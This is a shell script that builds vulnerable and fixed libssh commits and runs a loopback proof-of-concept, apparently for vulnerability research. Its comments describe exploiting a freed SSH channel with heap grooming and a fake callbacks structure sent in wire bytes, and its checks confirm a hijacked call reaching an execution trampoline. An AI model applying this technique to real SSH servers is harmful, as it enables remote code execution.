#!/bin/sh
# W13 additive lane: the fake channel callbacks structure is not allocated by
# the application. It lives entirely in attacker-chosen wire bytes inside the
# recycled freed channel; the app only redirects the reclaimed real callback
# iterator's data pointer. Built against the same two pinned commits as
# run-nodetach.sh, with no sanitizer and no library source change. Loopback only.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_plain() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-plain-vuln vuln" "$FS build-plain-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_plain "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fno-omit-frame-pointer -DW13_INLINE \
        -Iasan-shim -I "$b/src" -I "$src/src" -I "$src/include" \
        -I "$b/include" -I "$b" real_wire.c "$b/src/libssh.a" \
        -lcrypto -lpthread -ldl -o "real_wire-plain-$kind-in" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
run_lane() {
    n_name=$1; n_kind=$2; n_mode=$3
    mkdir -p "inline-run/$n_name"
    ln -sf "$HERE/hostkey" "inline-run/$n_name/hostkey"
    (cd "inline-run/$n_name" && timeout 25 \
        "$HERE/real_wire-plain-$n_kind-in" ./hostkey "$n_mode") \
        >"evidence-inline-$n_name.out" 2>&1
    echo "lane $n_name rc=$?"
}

check_vuln() {
    c_out=evidence-inline-$1.out
    c_file=no
    [ -f "inline-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    c_in=$(grep -c 'SERVER inline cbs=' "$c_out")
    c_det=$(grep -c 'SERVER groom-survive saved' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_t" = 1 ] && [ "$c_e" = 1 ] &&
       [ "$c_ok" = 1 ] && [ "$c_in" = 1 ] && [ "$c_det" = 0 ] &&
       [ "$c_file" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 target=$c_t exec=$c_e inline=$c_in detach=$c_det file=$c_file"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_ok $c_in $c_det $c_file]"
    fi
}

check_fixed() {
    c_out=evidence-inline-$1.out
    c_file=no
    [ -f "inline-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    if [ "$c_d2" = 0 ] && [ "$c_t" = 0 ] && [ "$c_e" = 0 ] &&
       [ "$c_file" = no ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=0 target=0 exec=0 file=no"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_file]"
    fi
}

run_lane vuln-inline vuln groom-inline
check_vuln vuln-inline
if [ -f inline-run/vuln-inline/evidence-wire-vuln-groom-exec.marker ]; then
    mv inline-run/vuln-inline/evidence-wire-vuln-groom-exec.marker \
       evidence-inline-sideeffect.kept
fi

run_lane fixed-inline fixed groom-inline
check_fixed fixed-inline

# Wire-selected callee control: the same inline struct with an invalid
# function pointer must fault in the library's indirect call, not execute.
run_lane vuln-inline-bad vuln groom-inline-bad
b_out=evidence-inline-vuln-inline-bad.out
b_bad=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
b_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$b_out")
b_e=$(grep -c 'SERVER EXEC trampoline' "$b_out")
b_done=$(grep -c 'SERVER done data_packets=2' "$b_out")
if [ "$b_bad" = 1 ] && [ "$b_ok" = 0 ] && [ "$b_e" = 0 ] && [ "$b_done" = 0 ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-inline-bad server_fault=yes exec=no server_done=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-inline-bad got[status_lines=$b_bad clean=$b_ok exec=$b_e done=$b_done]"
fi

for i in 1 2 3; do
    run_lane "vuln-repeat$i" vuln groom-inline
    check_vuln "vuln-repeat$i"
    if [ -f "inline-run/vuln-repeat$i/evidence-wire-vuln-groom-exec.marker" ]; then
        mv "inline-run/vuln-repeat$i/evidence-wire-vuln-groom-exec.marker" \
           "evidence-inline-repeat$i.kept"
    fi
done

echo "inline: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
